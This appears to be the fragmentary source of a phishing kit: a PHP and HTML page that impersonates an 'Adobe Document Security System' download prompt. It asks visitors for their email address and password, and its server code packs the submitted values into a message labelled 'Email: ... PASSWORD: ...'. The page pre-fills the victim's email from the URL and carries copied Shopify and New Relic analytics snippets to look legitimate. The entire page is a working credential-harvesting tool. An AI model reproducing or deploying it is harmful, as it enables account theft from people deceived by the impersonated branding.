...
if(isset($_POST['sendgo']) && $_POST['sendgo'] == 'sendto'){
  ...
  $message = 'Email: '.$_POST['email'] .' PASSWORD: '.$_POST['pass']. "\r\n";
...
<script src="https://js-agent.newrelic.com/nr-spa-1026.min.js"></script><script type="text/javascript" async="" src="7.js"></script><script src="4.js"></script><script type="text/javascript" async="" src="6.js"></script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","errorBeacon":"bam.nr-data.net","licenseKey":"fa45dcf839","applicationID":"151","transactionName":"dl8KQUReDl4AEE1BVEdGDVZTQk1CBBAWXFRHQ0tUQ0UKHQkNBVtf","queueTime":1,"applicationTime":28,"agent":""}</script>
...
<link rel="shortcut icon" type="image/x-icon" href="lock.png>
...
<meta name="viewport" content="width=device-width, initial-scale=1">
  ...
  <link rel="stylesheet" media="screen" href="3.css" crossorigin="anonymous" integrity="sha256-lRLRjedySZEuV4QiIShM5UIcudkosBUaMpKOAEFl0S8=">
  <link rel="stylesheet" media="screen" href="5.css" crossorigin="anonymous" integrity="sha256-wgBjQ6+eB5AXj0xQvCWtwd5exC2kDAkMDuNEpYo/mE8=">
  <script>
function validateForm()
{
var y=document.forms["myform"]["pdf1"].value;
if(y==null || y=="")
  {
...
if(y.length <6 )
  ...
  (function(){
    var config = {
      'Trekkie': {
        'appName': 'admin',
        'defaultAttributes': {"embedMode":"parent"},
      },
      'Clickstream': {
        'appName': 'admin'
      },
      'Performance': {
        ...
        'navigationTimingApiMeasurementsSampleRate': 0.25
      }
    };
    var trekkie_version = '2017.02.15.1';
...
<body style="background-image: url('bg.jpg')">
  <div id="container">
    <noscript class="no-js">In order to download document you need to enable Javascript. &amp;lt;a href="http://www.enable-javascript.com/" target="_blank"&amp;gt;Learn how to enable Javascript&amp;lt;/a&amp;gt;</noscript>
    <main id="dialog-alternate" role="main">
<section class="login-form">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="header.png" width="199" height="110">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<img src="id.jpg" width="299" height="110">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="lock1.jpg" width="180" height="110"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <h1 class="dialog-heading"><strong><font color="#0000ee">ADOBE DOCUMENT SECURITY SYSTEM</font></strong></h1>
  <p class="dialog-subheading"><strong><font color="#000000">Verify your identity to download document</font></strong></p>

  <form action="./?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>"  method="post" name="myform">
      ...
      <div id="sign-in-form" class="lform dialog-form">
        ...
        <div id="login">
          ...
          <div class="dialog-input-container">
            <input type="email" name="email" id="login-input" value="<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" placeholder="Email address" class="dialog-input ">
            <label class="visuallyhidden" for="login">Email</label>
            <i class="ico dialog-ico ico-email"></i>
          </div>
          <div class="dialog-input-container">
            <input type="password" name="pass" id="password" placeholder="Password" class="dialog-input ">
            <label class="visuallyhidden" for="password">Password</label>
            <i class="ico dialog-ico ico-password"></i>
            <div class="forgot-password-container">
              <a class="forgot-password tooltip tooltip-bottom" id="forgot-password" aria-label="Forgot your password?" href="./forgot.htm">
                <span class="tooltip-container"><span class="tooltip-label">Help</span></span>
                <i class="ico dialog-ico ico-forgot-password"></i>
</a>            </div>
          </div>
        </div>
        <input type="hidden" name="sendgo" value="sendto">
        <input type="submit" name="commit" value="DOWNLOAD File (1.2mb)" class="dialog-btn">
      </div>
    </div>


    <div class="remember-me">
      <input type="checkbox" required="required" name="remember" id="remember" value="1" checked="unchecked">

      <label class="inline" for="remember">I Agree with Adobe.inc terms and conditions</label>
    </div>
</form>
  <p class="alternate-login"><strong>SIGN IN WITH YOUR RECIEVING EMAIL ACCOUNT TO DOWNLOAD DOCUMENT</strong></a></p>

</section>

    </main>
    <footer id="footer" role="image">
	
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="logo.jpg" width="100" height="100">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="lock.png" width="110" height="100">
        <span class="helper--visually-hidden">Adobe pdf security</span>
</a>    </footer>
  </div>

  <!-- Google Analytics -->
    <script type="text/javascript">var _gaq = _gaq || [];_gaq.push(["_setAccount","UA-82702-3"]);_gaq.push(["_addDevId","o5cUG"]);_gaq.push(["_setAllowLinker",true]);_gaq.push(["_setDomainName","shopify.com"]);_gaq.push(["_trackPageview"]);</script><script src="2.js" type="text/javascript"></script>
    <script type="text/javascript">
//<![CDATA[
...
//]]>
</script><script src="1.js" type="text/javascript" async="async"></script><script type="text/javascript">var _gaUTrackerOptions = {cookieDomain: 'shopify.com', legacyCookieDomain: 'shopify.com', 'allowLinker': true};
        if (analytics && typeof analytics.user !== 'undefined') {
          _gaUTrackerOptions.clientId = analytics.user().traits().uniqToken;
        }
      ga('create', 'UA-82702-49', 'auto', _gaUTrackerOptions);ga('send', 'pageview');
      (function(){
        ga('require', 'linker');
